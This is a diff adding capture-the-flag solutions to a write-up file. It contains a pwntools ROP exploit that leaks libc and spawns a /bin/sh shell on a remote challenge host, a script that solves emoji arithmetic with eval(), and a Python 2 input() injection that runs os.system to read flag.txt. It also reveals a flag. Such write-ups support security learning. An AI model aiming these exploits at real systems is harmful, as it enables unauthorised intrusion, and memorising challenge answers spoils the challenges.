@@ -259,3 +259,90 @@ ssh makelarisjr@ip
 sudo su
 cd /root/ 
 ```
+## Controller
+```python
+from pwn import *
+from Crypto.Util.number import *
+
+libc = ELF("libc.so.6")
+p = remote('159.65.20.140',31544)
+#p = process('/home/kali/Desktop/controller')
+
+base = "A"*32 + "B"*8
+poprdi = 0x00000000004011d3
+libc_start = 0x601ff0
+puts = 0x400630
+main = 0x401124
+ret = 0x0000000000400606
+p.recvuntil('recources: ')
+p.sendline('-6 33')
+p.recvuntil('> ')
+p.sendline('3')
+p.recvuntil('> ')
+rop = base + p64(poprdi) + p64(libc_start) + p64(puts) + p64(main)
+p.sendline(rop)
+p.recvline()
+libc_start_main = bytes_to_long(p.recvline()[-2::-1])
+log.info("Address of leak libc = " + hex(libc_start_main))
+libc.address = libc_start_main - libc.sym["__libc_start_main"]
+log.info("Address of libc = " + hex(libc.address))
+
+rop = base + p64(poprdi) + p64(next(libc.search("/bin/sh"))) + p64(ret) + p64(libc.sym["system"])
+p.recvuntil('recources: ')
+p.sendline('-6 33')
+p.recvuntil('> ')
+p.sendline('3')
+p.recvuntil('> ')
+p.sendline(rop)
+p.interactive()
+```
+## Alien Camp
+```python
+from pwn import *
+import re
+import string
+import binascii
+import math
+import sympy
+
+context.log_level = "debug"
+
+p=remote("138.68.152.10",32397)
+p.recvuntil('> ')
+p.sendline("1")
+a = p.recvuntil('t!\n> ')
+p.sendline("2")
+res = [int(i) for i in a.split() if i.isdigit()]
+print(res)
+a = a.decode('utf-8')
+for xloe in range(0,500):
+    b = p.recvuntil("r: ")
+    c = b.splitlines()
+    calc = c[5]
+    calc = calc.decode('utf-8')
+    print(calc)
+    calc = calc.replace("  = ?","")
+    print(calc)
+    list2 = ["🌞","🍨","❌","🍪","🔥","⛔","🍧","👺","👾","🦄"]
+    list = {"🌞":res[0],"🍨":res[1],"❌":res[2],"🍪":res[3],"🔥":res[4],"⛔":res[5],"🍧":res[6],"👺":res[7],"👾":res[8],"🦄":res[9]}
+    for i in range(0,10):
+        if list2[i] in calc:
+            #print(list2[i])
+            #print(list["🌞"])
+            bb = list2[i]
+            cc = str(list[bb])
+            calc = calc.replace(list2[i],cc)
+    pload = str(eval(calc))
+    p.sendline(pload)
+p.recvall()
+```
+## Input as Service
+```
+ncat 46.101.22.121 31269
+2.7.18 (default, Apr 20 2020, 19:51:05)
+[GCC 9.2.0]
+Do you sound like an alien?
+>>>
+__import__('os').system("cat flag.txt")
+CHTB{4li3n5_us3_pyth0n2.X?!}
+```
